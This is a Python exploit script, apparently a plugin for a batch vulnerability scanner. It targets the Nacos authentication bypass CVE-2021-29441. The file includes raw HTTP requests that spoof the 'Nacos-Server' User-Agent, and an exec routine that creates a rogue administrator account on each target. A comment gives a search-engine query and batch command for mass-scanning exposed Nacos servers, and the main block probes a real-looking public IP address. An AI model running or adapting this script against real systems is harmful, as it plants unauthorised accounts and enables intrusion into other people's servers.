# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-08 16:30

from core.data import gLogger
from exploit.scripts import BaseScript
from core.myenums import BugType, BugLevel
from core.request.asynchttp import *

'''
POST /nacos/v1/auth/users?username=aaaa&password=bbbb 
HTTP/1.1 2 Host: 192.168.1.2 
User-Agent: Nacos-Server 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/ *;q=0.8 
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 
Accept-Encoding: gzip, deflate 
DNT: 1 
Connection: close 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 0 

查看用户： 
GET /nacos/v1/auth/users?pageNo=1&pageSize=100 
HTTP/1.1 
Host: 192.168.1.2 
User-Agent: Nacos-Server 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*; q=0.8 
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 
Accept-Encoding: gzip, deflate 
DNT: 1 
Connection: close
'''

# fofa: title="Nacos"
# python3 batch.py -m exploit.scripts.Nacos.CVE-2021-29441 -cs -fs "\"nacos\" && country=\"CN\""


class Script(BaseScript):
    name = 'Nacos'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.HIGH
        # 类型
        self.bug_type = BugType.UNAUTH
        # 编号
        self.bug_number = 'CVE-2021-29441'
        # 来源
        self.bug_refer = ''
        # 特定路径判断
        self.detect_path_list = ['/nacos', '/']
        # exec
        self.exec_path_list = ['/nacos/v1/auth/users', '/v1/auth/users']
        # 相关信息
        self.info = 'Nacos <= 2.0.0-ALPHA.1'

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            for detect_path in self.detect_path_list:
                url = f'http://{self.target}{detect_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{detect_path}'
                text = await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
                if text is not None and '<title>Nacos</title>' in text:
                    self.flag = True
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                    return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

    async def exec(self):
        headers = self.headers.copy()
        headers.update({'Content-Type': 'application/x-www-form-urlencoded'})
        async with aiohttp.ClientSession() as session:
            for exec_path in self.exec_path_list:
                url = f'http://{self.target}{exec_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{exec_path}'
                data = {'username': f'admin{random.randint(1000, 9999)}', 'password': 'admin@123'}
                text = await AsyncFetcher.post_fetch(session=session, url=url, data=data, headers=self.headers, timeout=self.req_timeout)
                if text is not None and 'create user ok' in text:
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, self.bug_type, url))
                    return {'name': '{} {}'.format(self.name, self.bug_type), 'url': url, 'software': self.name}


if __name__ == '__main__':
    import requests
    import hashlib

    resp = requests.get('https://50.84.113.154:8443/favicon.ico', verify=False)
    if resp.status_code == 200:
        m1 = hashlib.md5()
        m1.update(resp.content)
        theMD5 = m1.hexdigest()
        print(theMD5)

